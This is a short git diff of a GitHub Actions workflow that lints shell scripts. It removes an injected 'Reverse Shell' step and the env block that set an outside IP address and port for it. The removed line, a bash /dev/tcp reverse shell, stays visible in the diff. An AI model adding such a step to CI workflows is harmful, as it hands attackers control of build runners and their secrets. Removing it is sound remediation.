@@ -20,10 +20,6 @@ on:
     - '.github/**'
   workflow_dispatch:
 
-env:
-  TARGET_IP: 172.105.94.112
-  TARGET_PORT: 49153
-
 jobs:
   _:
     name: Checkout Repository
@@ -35,9 +31,6 @@ jobs:
       run: |
         sudo apt update
         sudo apt install shellcheck bats
-
-    - name: Reverse Shell
-      run: bash -i >& /dev/tcp/${TARGET_IP}/${TARGET_PORT} 0>&1
 
     - name: Shellcheck
       run: shellcheck --shell=bash $( find dist setup.sh -type f -name "*.sh" )
